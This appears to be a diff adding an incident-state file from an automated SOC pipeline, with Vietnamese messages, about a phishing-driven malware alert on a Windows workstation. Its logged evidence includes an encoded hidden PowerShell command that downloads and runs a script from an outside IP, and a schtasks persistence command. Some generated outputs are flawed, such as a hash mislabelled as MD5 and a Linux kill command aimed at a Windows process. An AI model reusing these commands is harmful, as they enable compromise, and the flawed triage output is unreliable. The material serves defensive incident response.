+      "metadata": {
+        "escalated": true,
+        "highest_threat_score": 92
+      }
+    },
+    {
+      "timestamp": "2026-10-22T07:24:43.183994Z",
+      "node": "enrichment",
+      "from_status": "INVESTIGATING",
+      "to_status": "INVESTIGATING",
+      "message": "Hoàn tất làm giàu dữ liệu tình báo mối đe dọa (CTI Enrichment)",
+      "metadata": {
+        "ioc_count": 3,
+        "mitre_count": 1
+      }
+    },
+    {
+      "timestamp": "2026-10-22T07:24:43.184128Z",
+      "node": "rca",
+      "from_status": "INVESTIGATING",
+      "to_status": "INVESTIGATING",
+      "message": "Tái hiện thành công chuỗi tiến trình (Process Lineage) và nguyên nhân gốc rễ",
+      "metadata": {
+        "tree_depth": 4,
+        "initial_vector": "Spearphishing Email / Malicious Attachment"
+      }
+    },
+    {
+      "timestamp": "2026-10-22T07:24:43.184289Z",
+      "node": "response",
+      "from_status": "INVESTIGATING",
+      "to_status": "INVESTIGATING",
+      "message": "Đã đề xuất 3 hành động ứng phó khẩn cấp theo NIST SP 800-61",
+      "metadata": {
+        "action_count": 3
+      }
+    },
+    {
+      "timestamp": "2026-10-22T07:24:43.184318Z",
+      "node": "hitl_approval",
+      "from_status": "INVESTIGATING",
+      "to_status": "AWAITING_APPROVAL",
+      "message": "Pipeline tạm dừng tại điểm ngắt HITL - Đang chờ chuyên viên phê duyệt hành động",
+      "metadata": {
+        "awaiting_approval": true,
+        "pending_count": 2
+      }
+    },
+    {
+      "timestamp": "2026-10-22T07:25:00.808897Z",
+      "node": "hitl_approval",
+      "from_status": "AWAITING_APPROVAL",
+      "to_status": "CONTAINED",
+      "message": "Chuyên viên phê duyệt hành động ứng phó: Chuyên viên SOC đã xác nhận kế hoạch can thiệp trên giao diện Web HITL",
+      "metadata": {
+        "approved": true,
+        "feedback": "Chuyên viên SOC đã xác nhận kế hoạch can thiệp trên giao diện Web HITL"
+      }
+    },
+    {
+      "timestamp": "2026-10-22T07:25:00.809004Z",
+      "node": "reporting",
+      "from_status": "CONTAINED",
+      "to_status": "RESOLVED",
+      "message": "Đã xuất bản thành công Báo cáo Điều tra Toàn diện (Final Incident Report)",
+      "metadata": {
+        "report_id": "REP-INC-MALW-072438"
+      }
+    },
+    {
+      "timestamp": "2026-10-22T07:25:02.202355Z",
+      "node": "hitl_approval",
+      "from_status": "RESOLVED",
+      "to_status": "CONTAINED",
+      "message": "Chuyên viên phê duyệt hành động ứng phó: Chuyên viên SOC đã xác nhận kế hoạch can thiệp trên giao diện Web HITL",
+      "metadata": {
+        "approved": true,
+        "feedback": "Chuyên viên SOC đã xác nhận kế hoạch can thiệp trên giao diện Web HITL"
+      }
+    },
+    {
+      "timestamp": "2026-10-22T07:25:02.202446Z",
+      "node": "reporting",
+      "from_status": "CONTAINED",
+      "to_status": "RESOLVED",
+      "message": "Đã xuất bản thành công Báo cáo Điều tra Toàn diện (Final Incident Report)",
+      "metadata": {
+        "report_id": "REP-INC-MALW-072438"
+      }
+    },
+    {
+      "timestamp": "2026-10-22T07:25:19.154043Z",
+      "node": "hitl_rollback_all",
+      "from_status": "CLOSED_FALSE_POSITIVE",
+      "to_status": "CLOSED_FALSE_POSITIVE",
+      "message": "Chuyên viên soc_analyst_01 hoàn tác hàng loạt 2 hành động (FALSE_POSITIVE).",
+      "metadata": {
+        "rolled_back_action_ids": [
+          "ACT-MALW-ISOLATE",
+          "ACT-MALW-BLOCK"
+        ],
+        "rollback_reason": "FALSE_POSITIVE",
+        "analyst_id": "soc_analyst_01",
+        "notes": "123"
+      }
+    },
+    {
+      "timestamp": "2026-10-22T07:25:28.559882Z",
+      "node": "hitl_approval",
+      "from_status": "CLOSED_FALSE_POSITIVE",
+      "to_status": "CONTAINED",
+      "message": "Chuyên viên phê duyệt hành động ứng phó: Chuyên viên SOC đã xác nhận kế hoạch can thiệp trên giao diện Web HITL",
+      "metadata": {
+        "approved": true,
+        "feedback": "Chuyên viên SOC đã xác nhận kế hoạch can thiệp trên giao diện Web HITL"
+      }
+    },
+    {
+      "timestamp": "2026-10-22T07:25:28.559965Z",
+      "node": "reporting",
+      "from_status": "CONTAINED",
+      "to_status": "RESOLVED",
+      "message": "Đã xuất bản thành công Báo cáo Điều tra Toàn diện (Final Incident Report)",
+      "metadata": {
+        "report_id": "REP-INC-MALW-072438"
+      }
+    },
+    {
+      "timestamp": "2026-10-22T07:25:35.593878Z",
+      "node": "hitl_approval",
+      "from_status": "RESOLVED",
+      "to_status": "INVESTIGATING",
+      "message": "Chuyên viên từ chối hoặc bảo lưu kế hoạch: Chuyên viên SOC đã xác nhận kế hoạch can thiệp trên giao diện Web HITL",
+      "metadata": {
+        "approved": false,
+        "feedback": "Chuyên viên SOC đã xác nhận kế hoạch can thiệp trên giao diện Web HITL"
+      }
+    },
+    {
+      "timestamp": "2026-10-22T07:25:35.593986Z",
+      "node": "reporting",
+      "from_status": "INVESTIGATING",
+      "to_status": "RESOLVED",
+      "message": "Đã xuất bản thành công Báo cáo Điều tra Toàn diện (Final Incident Report)",
+      "metadata": {
+        "report_id": "REP-INC-MALW-072438"
+      }
+    }
+  ],
+  "checkpoints": {
+    "ingestion": {
+      "node": "ingestion",
+      "status": "NEW",
+      "timestamp": "2026-10-22T07:24:43.183548+00:00",
+      "parsed_events_count": 4,
+      "has_triage": false,
+      "has_threat_intel": false,
+      "has_rca": false,
+      "has_report": false
+    },
+    "triage": {
+      "node": "triage",
+      "status": "INVESTIGATING",
+      "timestamp": "2026-10-22T07:24:43.183664+00:00",
+      "parsed_events_count": 4,
+      "has_triage": true,
+      "has_threat_intel": false,
+      "has_rca": false,
+      "has_report": false
+    },
+    "enrichment": {
+      "node": "enrichment",
+      "status": "INVESTIGATING",
+      "timestamp": "2026-10-22T07:24:43.184001+00:00",
+      "parsed_events_count": 4,
+      "has_triage": true,
+      "has_threat_intel": true,
+      "has_rca": false,
+      "has_report": false
+    },
+    "rca": {
+      "node": "rca",
+      "status": "INVESTIGATING",
+      "timestamp": "2026-10-22T07:24:43.184136+00:00",
+      "parsed_events_count": 4,
+      "has_triage": true,
+      "has_threat_intel": true,
+      "has_rca": true,
+      "has_report": false
+    },
+    "response": {
+      "node": "response",
+      "status": "INVESTIGATING",
+      "timestamp": "2026-10-22T07:24:43.184297+00:00",
+      "parsed_events_count": 4,
+      "has_triage": true,
+      "has_threat_intel": true,
+      "has_rca": true,
+      "has_report": false
+    },
+    "hitl_approval": {
+      "node": "hitl_approval",
+      "status": "INVESTIGATING",
+      "timestamp": "2026-10-22T07:25:35.593922+00:00",
+      "parsed_events_count": 4,
+      "has_triage": true,
+      "has_threat_intel": true,
+      "has_rca": true,
+      "has_report": true
+    },
+    "reporting": {
+      "node": "reporting",
+      "status": "RESOLVED",
+      "timestamp": "2026-10-22T07:25:35.593998+00:00",
+      "parsed_events_count": 4,
+      "has_triage": true,
+      "has_threat_intel": true,
+      "has_rca": true,
+      "has_report": true
+    },
+    "pre_rollback_all_1792653919": {
+      "incident_id": "INC-MALW-072438",
+      "status": "RESOLVED",
+      "created_at": "2026-10-22T07:24:38.009164Z",
+      "updated_at": "2026-10-22T07:25:02.202446Z",
+      "raw_logs": [
+        {
+          "log_source": "wazuh",
+          "raw_payload": "{\"timestamp\": \"2026-10-15T09:30:12.000+0000\", \"rule\": {\"level\": 12, \"description\": \"Sysmon - Event 1: Suspicious Process creation by powershell.exe with encoded payload\", \"id\": \"92211\", \"mitre\": {\"id\": [\"T1059.001\", \"T1027\"], \"tactic\": [\"Execution\", \"Defense Evasion\"], \"technique\": [\"Command and Scripting Interpreter: PowerShell\", \"Obfuscated Files or Information\"]}, \"groups\": [\"windows\", \"sysmon\", \"sysmon_process_creation\"]}, \"agent\": {\"id\": \"002\", \"name\": \"WIN10-VICTIM-01\", \"ip\": \"192.168.1.105\"}, \"id\": \"1760520612.2001\", \"full_log\": \"Sysmon Event 1: Process Creation: powershell.exe\", \"data\": {\"win\": {\"system\": {\"eventID\": \"1\", \"computer\": \"WIN10-VICTIM-01\"}, \"eventdata\": {\"image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"commandLine\": \"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAyADYALgAyADkALgAxADEAMgAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA\", \"parentImage\": \"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE\", \"parentCommandLine\": \"WINWORD.EXE\", \"hashes\": \"SHA256=2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91\", \"user\": \"HCMUTE\\\\truongdo\", \"destinationIp\": \"194.26.29.112\", \"destinationPort\": \"443\", \"mordorProcessAccessEventId\": \"10\", \"mordorSourceProcess\": \"C:\\\\windows\\\\Explorer.EXE\", \"mordorTargetProcess\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"mordorTrace\": \"psh_powershell_httplistener\"}}}}",
+          "collected_at": "2026-10-22T07:24:38.009048Z"
+        },
+        {
+          "log_source": "wazuh",
+          "raw_payload": "{\"timestamp\": \"2026-10-15T09:30:16.000+0000\", \"rule\": {\"level\": 9, \"description\": \"Sysmon - Event 11: File created in Temp directory by untrusted script\", \"id\": \"92215\", \"mitre\": {\"id\": [\"T1105\"], \"tactic\": [\"Command and Control\"], \"technique\": [\"Ingress Tool Transfer\"]}, \"groups\": [\"windows\", \"sysmon\", \"sysmon_file_create\"]}, \"agent\": {\"id\": \"002\", \"name\": \"WIN10-VICTIM-01\", \"ip\": \"192.168.1.105\"}, \"id\": \"1760520616.2002\", \"full_log\": \"Sysmon Event 11: FileCreate: invoice_scan_v8.exe in Temp\", \"data\": {\"win\": {\"system\": {\"eventID\": \"11\", \"computer\": \"WIN10-VICTIM-01\"}, \"eventdata\": {\"image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"targetFilename\": \"C:\\\\Users\\\\truongdo\\\\AppData\\\\Local\\\\Temp\\\\invoice_scan_v8.exe\", \"hashes\": \"SHA256=2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91\", \"user\": \"HCMUTE\\\\truongdo\", \"mordorTrace\": \"psh_powershell_httplistener\"}}}}",
+          "collected_at": "2026-10-22T07:24:38.009108Z"
+        },
+        {
+          "log_source": "wazuh",
+          "raw_payload": "{\"timestamp\": \"2026-10-15T09:30:22.000+0000\", \"rule\": {\"level\": 10, \"description\": \"Sysmon - Event 3: Suspicious network connection initiated by PowerShell to unknown public IP\", \"id\": \"92213\", \"mitre\": {\"id\": [\"T1071.001\"], \"tactic\": [\"Command and Control\"], \"technique\": [\"Application Layer Protocol: Web Protocols\"]}, \"groups\": [\"windows\", \"sysmon\", \"sysmon_network_connect\"]}, \"agent\": {\"id\": \"002\", \"name\": \"WIN10-VICTIM-01\", \"ip\": \"192.168.1.105\"}, \"id\": \"1760520622.2003\", \"full_log\": \"Sysmon Event 3: Network connection detected to 194.26.29.112:443\", \"data\": {\"win\": {\"system\": {\"eventID\": \"3\", \"computer\": \"WIN10-VICTIM-01\"}, \"eventdata\": {\"image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"sourceIp\": \"192.168.1.105\", \"sourcePort\": \"51234\", \"destinationIp\": \"194.26.29.112\", \"destinationPort\": \"443\", \"protocol\": \"tcp\", \"mordorTrace\": \"psh_powershell_httplistener\"}}}}",
+          "collected_at": "2026-10-22T07:24:38.009131Z"
+        },
+        {
+          "log_source": "wazuh",
+          "raw_payload": "{\"timestamp\": \"2026-10-15T09:31:05.000+0000\", \"rule\": {\"level\": 8, \"description\": \"Sysmon - Event 1: Persistence established via schtasks.exe registration\", \"id\": \"92218\", \"mitre\": {\"id\": [\"T1053.005\"], \"tactic\": [\"Persistence\"], \"technique\": [\"Scheduled Task/Job: Scheduled Task\"]}, \"groups\": [\"windows\", \"sysmon\", \"persistence\"]}, \"agent\": {\"id\": \"002\", \"name\": \"WIN10-VICTIM-01\", \"ip\": \"192.168.1.105\"}, \"id\": \"1760520665.2004\", \"full_log\": \"Sysmon Event 1: Process Creation: schtasks.exe\", \"data\": {\"win\": {\"system\": {\"eventID\": \"1\", \"computer\": \"WIN10-VICTIM-01\"}, \"eventdata\": {\"image\": \"C:\\\\Windows\\\\System32\\\\schtasks.exe\", \"commandLine\": \"schtasks /create /tn \\\"WindowsTelemetryUpdate\\\" /tr \\\"C:\\\\Users\\\\truongdo\\\\AppData\\\\Local\\\\Temp\\\\invoice_scan_v8.exe\\\" /sc onlogon\", \"parentImage\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"user\": \"HCMUTE\\\\truongdo\", \"mordorTrace\": \"psh_powershell_httplistener\"}}}}",
+          "collected_at": "2026-10-22T07:24:38.009147Z"
+        }
+      ],
+      "parsed_events": [
+        {
+          "event_id": "Wazuh-1",
+          "timestamp": "2026-10-22T07:24:43.182579Z",
+          "source_type": "WazuhSIEM",
+          "host_name": "WIN10-VICTIM-01",
+          "user_name": "HCMUTE\\truongdo",
+          "process_name": "powershell.exe",
+          "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAyADYALgAyADkALgAxADEAMgAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
+          "parent_process": "WINWORD.EXE",
+          "parent_command_line": null,
+          "source_ip": "192.168.1.105",
+          "source_port": null,
+          "dest_ip": "194.26.29.112",
+          "dest_port": 443,
+          "file_hash": "SHA256=2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91",
+          "raw_attributes": {
+            "wazuh_alert_id": "1760520612.2001",
+            "wazuh_rule_id": "92211",
+            "wazuh_rule_level": 12,
+            "wazuh_rule_description": "Sysmon - Event 1: Suspicious Process creation by powershell.exe with encoded payload",
+            "wazuh_agent_id": "002",
+            "wazuh_agent_name": "WIN10-VICTIM-01",
+            "wazuh_groups": [
+              "windows",
+              "sysmon",
+              "sysmon_process_creation"
+            ],
+            "wazuh_mitre_ids": [
+              "T1059.001",
+              "T1027"
+            ],
+            "encoded_payload": "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAyADYALgAyADkALgAxADEAMgAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
+          }
+        },
+        {
+          "event_id": "Wazuh-11",
+          "timestamp": "2026-10-22T07:24:43.183307Z",
+          "source_type": "WazuhSIEM",
+          "host_name": "WIN10-VICTIM-01",
+          "user_name": "HCMUTE\\truongdo",
+          "process_name": "powershell.exe",
+          "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "command_line": null,
+          "parent_process": null,
+          "parent_command_line": null,
+          "source_ip": "192.168.1.105",
+          "source_port": null,
+          "dest_ip": null,
+          "dest_port": null,
+          "file_hash": "SHA256=2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91",
+          "raw_attributes": {
+            "wazuh_alert_id": "1760520616.2002",
+            "wazuh_rule_id": "92215",
+            "wazuh_rule_level": 9,
+            "wazuh_rule_description": "Sysmon - Event 11: File created in Temp directory by untrusted script",
+            "wazuh_agent_id": "002",
+            "wazuh_agent_name": "WIN10-VICTIM-01",
+            "wazuh_groups": [
+              "windows",
+              "sysmon",
+              "sysmon_file_create"
+            ],
+            "wazuh_mitre_ids": [
+              "T1105"
+            ]
+          }
+        },
+        {
+          "event_id": "Wazuh-3",
+          "timestamp": "2026-10-22T07:24:43.183383Z",
+          "source_type": "WazuhSIEM",
+          "host_name": "WIN10-VICTIM-01",
+          "user_name": null,
+          "process_name": "powershell.exe",
+          "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "command_line": null,
+          "parent_process": null,
+          "parent_command_line": null,
+          "source_ip": "192.168.1.105",
+          "source_port": null,
+          "dest_ip": "194.26.29.112",
+          "dest_port": 443,
+          "file_hash": null,
+          "raw_attributes": {
+            "wazuh_alert_id": "1760520622.2003",
+            "wazuh_rule_id": "92213",
+            "wazuh_rule_level": 10,
+            "wazuh_rule_description": "Sysmon - Event 3: Suspicious network connection initiated by PowerShell to unknown public IP",
+            "wazuh_agent_id": "002",
+            "wazuh_agent_name": "WIN10-VICTIM-01",
+            "wazuh_groups": [
+              "windows",
+              "sysmon",
+              "sysmon_network_connect"
+            ],
+            "wazuh_mitre_ids": [
+              "T1071.001"
+            ]
+          }
+        },
+        {
+          "event_id": "Wazuh-1",
+          "timestamp": "2026-10-22T07:24:43.183442Z",
+          "source_type": "WazuhSIEM",
+          "host_name": "WIN10-VICTIM-01",
+          "user_name": "HCMUTE\\truongdo",
+          "process_name": "schtasks.exe",
+          "process_path": "C:\\Windows\\System32\\schtasks.exe",
+          "command_line": "schtasks /create /tn \"WindowsTelemetryUpdate\" /tr \"C:\\Users\\truongdo\\AppData\\Local\\Temp\\invoice_scan_v8.exe\" /sc onlogon",
+          "parent_process": "powershell.exe",
+          "parent_command_line": null,
+          "source_ip": "192.168.1.105",
+          "source_port": null,
+          "dest_ip": null,
+          "dest_port": null,
+          "file_hash": null,
+          "raw_attributes": {
+            "wazuh_alert_id": "1760520665.2004",
+            "wazuh_rule_id": "92218",
+            "wazuh_rule_level": 8,
+            "wazuh_rule_description": "Sysmon - Event 1: Persistence established via schtasks.exe registration",
+            "wazuh_agent_id": "002",
+            "wazuh_agent_name": "WIN10-VICTIM-01",
+            "wazuh_groups": [
+              "windows",
+              "sysmon",
+              "persistence"
+            ],
+            "wazuh_mitre_ids": [
+              "T1053.005"
+            ]
+          }
+        }
+      ],
+      "triage_result": {
+        "is_incident": true,
+        "confidence_score": 0.85,
+        "severity": "CRITICAL",
+        "summary": "Wazuh Rule Level cao (12): ; Phát hiện mẫu lệnh độc hại nguy hiểm '-enc'; Kết nối tới IP độc hại C2 đã biết: 194.26.29.112; Wazuh Rule Level trung bình (9); Wazuh Rule Level cao (10): ; Kết nối tới IP độc hại C2 đã biết: 194.26.29.112; Wazuh Rule Level trung bình (8) [Self-Correction: Tự động nâng cấp mức độ nguy hiểm từ MEDIUM lên CRITICAL do phát hiện IoC có điểm đe dọa CTI cao: 92/100]",
+        "rule_or_model": "Builtin-Heuristic-Engine",
+        "attack_category": null,
+        "attack_type": null,
+        "primary_mitre_tactics": []
+      },
+      "threat_intel": {
+        "extracted_iocs": [
+          {
+            "ioc_type": "IP",
+            "value": "194.26.29.112",
+            "reputation_score": 92,
+            "is_malicious": true,
+            "threat_actor": "Cobalt Strike Team / RedLine Stealer",
+            "details": {
+              "reputation_score": 92,
+              "threat_actor": "Cobalt Strike Team / RedLine Stealer",
+              "country": "RU",
+              "isp": "BadHost Ltd",
+              "categories": [
+                "C2",
+                "Botnet"
+              ]
+            },
+            "cti_score": null,
+            "first_seen": null,
+            "last_seen": null,
+            "mitre_tactics": [],
+            "is_public": null,
+            "context_source": null
+          },
+          {
+            "ioc_type": "MD5",
+            "value": "SHA256=2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91",
+            "reputation_score": 85,
+            "is_malicious": true,
+            "threat_actor": "Known Malware Sample",
+            "details": {},
+            "cti_score": null,
+            "first_seen": null,
+            "last_seen": null,
+            "mitre_tactics": [],
+            "is_public": null,
+            "context_source": null
+          },
+          {
+            "ioc_type": "MD5",
+            "value": "SHA256=2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91",
+            "reputation_score": 85,
+            "is_malicious": true,
+            "threat_actor": "Known Malware Sample",
+            "details": {},
+            "cti_score": null,
+            "first_seen": null,
+            "last_seen": null,
+            "mitre_tactics": [],
+            "is_public": null,
+            "context_source": null
+          }
+        ],
+        "indicators": [
+          {
+            "ioc_type": "IP",
+            "value": "194.26.29.112",
+            "reputation_score": 92,
+            "is_malicious": true,
+            "threat_actor": "Cobalt Strike Team / RedLine Stealer",
+            "details": {
+              "reputation_score": 92,
+              "threat_actor": "Cobalt Strike Team / RedLine Stealer",
+              "country": "RU",
+              "isp": "BadHost Ltd",
+              "categories": [
+                "C2",
+                "Botnet"
+              ]
+            },
+            "cti_score": null,
+            "first_seen": null,
+            "last_seen": null,
+            "mitre_tactics": [],
+            "is_public": null,
+            "context_source": null
+          },
+          {
+            "ioc_type": "MD5",
+            "value": "SHA256=2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91",
+            "reputation_score": 85,
+            "is_malicious": true,
+            "threat_actor": "Known Malware Sample",
+            "details": {},
+            "cti_score": null,
+            "first_seen": null,
+            "last_seen": null,
+            "mitre_tactics": [],
+            "is_public": null,
+            "context_source": null
+          },
+          {
+            "ioc_type": "MD5",
+            "value": "SHA256=2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91",
+            "reputation_score": 85,
+            "is_malicious": true,
+            "threat_actor": "Known Malware Sample",
+            "details": {},
+            "cti_score": null,
+            "first_seen": null,
+            "last_seen": null,
+            "mitre_tactics": [],
+            "is_public": null,
+            "context_source": null
+          }
+        ],
+        "related_threat_actors": [
+          "Cobalt Strike Team / RedLine Stealer"
+        ],
+        "mitre_techniques": [
+          "T1059.001"
+        ],
+        "enrichment_summary": "Đã phát hiện và làm giàu 3 IoCs, ánh xạ 3 kỹ thuật MITRE ATT&CK."
+      },
+      "rca_result": {
+        "initial_access_vector": "Spearphishing Email / Malicious Attachment",
+        "attack_timeline": [
+          "[07:24:43] powershell.exe thực thi: powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -",
+          "[07:24:43] powershell.exe thực thi: ",
+          "[07:24:43] powershell.exe thực thi: ",
+          "[07:24:43] schtasks.exe thực thi: schtasks /create /tn \"WindowsTelemetryUpdate\" /tr \"C:\\Users\\"
+        ],
+        "process_tree": [
+          {
+            "process_id": "PID-1000",
+            "process_name": "powershell.exe",
+            "command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAyADYALgAyADkALgAxADEAMgAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
+            "parent_id": null,
+            "is_malicious_origin": true
+          },
+          {
+            "process_id": "PID-1001",
+            "process_name": "powershell.exe",
+            "command_line": "",
+            "parent_id": "PID-1000",
+            "is_malicious_origin": false
+          },
+          {
+            "process_id": "PID-1002",
+            "process_name": "powershell.exe",
+            "command_line": "",
+            "parent_id": "PID-1001",
+            "is_malicious_origin": false
+          },
+          {
+            "process_id": "PID-1003",
+            "process_name": "schtasks.exe",
+            "command_line": "schtasks /create /tn \"WindowsTelemetryUpdate\" /tr \"C:\\Users\\truongdo\\AppData\\Local\\Temp\\invoice_scan_v8.exe\" /sc onlogon",
+            "parent_id": "PID-1002",
+            "is_malicious_origin": false
+          }
+        ],
+        "high_fidelity_tree": [],
+        "mitre_tactics": [
+          "Initial Access",
+          "Execution",
+          "Defense Evasion"
+        ],
+        "root_cause_summary": "Tấn công khởi nguồn từ Spearphishing Email / Malicious Attachment, thực thi chuỗi tiến trình độc hại qua 4 bước.",
+        "confirmed_attack_type": null,
+        "attack_scope": null
+      },
+      "recommended_actions": [
+        {
+          "action_id": "ACT-MALW-ISOLATE",
+          "action_type": "ISOLATE_HOST",
+          "target": "WIN10-VICTIM-01",
+          "description": "Cô lập máy trạm WIN10-VICTIM-01 khỏi mạng nội bộ để ngăn chặn lây lan.",
+          "priority": 1,
+          "require_human_approval": true,
+          "is_approved": true,
+          "parameters": {},
+          "phase": "CONTAINMENT",
+          "script_bundle": {
+            "bundle_id": "BUNDLE-7B191C56",
+            "action_id": "ACT-MALW-ISOLATE",
+            "phase": "CONTAINMENT",
+            "target": "WIN10-VICTIM-01",
+            "powershell_script": "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True; New-NetFirewallRule -DisplayName 'BlockAllExceptWazuh' -Direction Outbound -Action Block",
+            "bash_script": "iptables -A OUTPUT -p tcp ! --dport 1514 -j DROP; iptables -A INPUT -p tcp ! --sport 1514 -j DROP",
+            "wazuh_active_response": {
+              "command": "host-isolate",
+              "target": "WIN10-VICTIM-01"
+            },
+            "rollback_script": "Remove-NetFirewallRule -DisplayName 'BlockAllExceptWazuh'; Enable-NetAdapter -Name * -Confirm:$false",
+            "instructions": "Cô lập máy trạm WIN10-VICTIM-01 khỏi mạng nội bộ (giữ kết nối Wazuh Manager). Rollback: gỡ luật cách ly và mở lại card mạng.",
+            "created_at": "2026-10-22T07:24:43.184206Z"
+          }
+        },
+        {
+          "action_id": "ACT-MALW-KILL",
+          "action_type": "KILL_PROCESS",
+          "target": "schtasks.exe",
+          "description": "Tiêu diệt tiến trình độc hại schtasks.exe đang chạy trên máy trạm.",
+          "priority": 2,
+          "require_human_approval": false,
+          "is_approved": true,
+          "parameters": {},
+          "phase": "CONTAINMENT",
+          "script_bundle": {
+            "bundle_id": "BUNDLE-BDB2A96E",
+            "action_id": "ACT-MALW-KILL",
+            "phase": "CONTAINMENT",
+            "target": "schtasks.exe",
+            "powershell_script": "Stop-Process -Name 'schtasks.exe' -Force -ErrorAction SilentlyContinue",
+            "bash_script": "pkill -9 -f 'schtasks.exe'",
+            "wazuh_active_response": {
+              "command": "kill-process",
+              "target": "schtasks.exe"
+            },
+            "rollback_script": null,
+            "instructions": "Tiêu diệt tiến trình độc hại schtasks.exe. Lưu ý: Hành động này không thể hoàn tác tự động (Irreversible).",
+            "created_at": "2026-10-22T07:24:43.184246Z"
+          }
+        },
+        {
+          "action_id": "ACT-MALW-BLOCK",
+          "action_type": "BLOCK_IP",
+          "target": "194.26.29.112",
+          "description": "Chặn địa chỉ IP C2 194.26.29.112 trên Firewall và Web Proxy.",
+          "priority": 1,
+          "require_human_approval": true,
+          "is_approved": true,
+          "parameters": {},
+          "phase": "CONTAINMENT",
+          "script_bundle": {
+            "bundle_id": "BUNDLE-14C949F6",
+            "action_id": "ACT-MALW-BLOCK",
+            "phase": "CONTAINMENT",
+            "target": "194.26.29.112",
+            "powershell_script": "New-NetFirewallRule -DisplayName 'Block_194.26.29.112' -Direction Inbound -Action Block -RemoteAddress 194.26.29.112",
+            "bash_script": "iptables -I INPUT -s 194.26.29.112 -j DROP; iptables -I FORWARD -s 194.26.29.112 -j DROP",
+            "wazuh_active_response": {
+              "command": "firewall-drop",
+              "target": "194.26.29.112"
+            },
+            "rollback_script": "Remove-NetFirewallRule -DisplayName 'Block_194.26.29.112'",
+            "instructions": "Chặn địa chỉ IP độc hại 194.26.29.112 trên Firewall. Rollback: xóa luật chặn iptables/Windows Firewall.",
+            "created_at": "2026-10-22T07:24:43.184271Z"
+          }
+        }
+      ],
+      "final_report": {
+        "report_id": "REP-INC-MALW-072438",
+        "incident_title": "Báo cáo Điều tra Sự cố [CRITICAL]: Endpoint Malware & C2 Reverse Shell - INC-MALW-072438",
+        "created_at": "2026-10-22T07:25:02.202413Z",
+        "executive_summary": "Sự cố INC-MALW-072438 được phát hiện và xử lý tự động bởi hệ thống SOC Multi-Agent. Đánh giá rủi ro: CRITICAL. Định danh loại tấn công: Endpoint Malware & C2 Reverse Shell. Wazuh Rule Level cao (12): ; Phát hiện mẫu lệnh độc hại nguy hiểm '-enc'; Kết nối tới IP độc hại C2 đã biết: 194.26.29.112; Wazuh Rule Level trung bình (9); Wazuh Rule Level cao (10): ; Kết nối tới IP độc hại C2 đã biết: 194.26.29.112; Wazuh Rule Level trung bình (8) [Self-Correction: Tự động nâng cấp mức độ nguy hiểm từ MEDIUM lên CRITICAL do phát hiện IoC có điểm đe dọa CTI cao: 92/100] Đã kích hoạt 3 biện pháp ngăn chặn kịp thời.",
+        "detailed_findings": "1. Tổng số sự kiện phân tích: 4\n2. Nguồn xâm nhập ban đầu: Spearphishing Email / Malicious Attachment\n3. Tóm lược phân tích nguyên nhân: Tấn công khởi nguồn từ Spearphishing Email / Malicious Attachment, thực thi chuỗi tiến trình độc hại qua 4 bước.",
+        "mitre_attack_matrix_mapping": [
+          "T1059.001"
+        ],
+        "ioc_table": [
+          {
+            "ioc_type": "IP",
+            "value": "194.26.29.112",
+            "reputation_score": 92,
+            "is_malicious": true,
+            "threat_actor": "Cobalt Strike Team / RedLine Stealer",
+            "details": {
+              "reputation_score": 92,
+              "threat_actor": "Cobalt Strike Team / RedLine Stealer",
+              "country": "RU",
+              "isp": "BadHost Ltd",
+              "categories": [
+                "C2",
+                "Botnet"
+              ]
+            },
+            "cti_score": null,
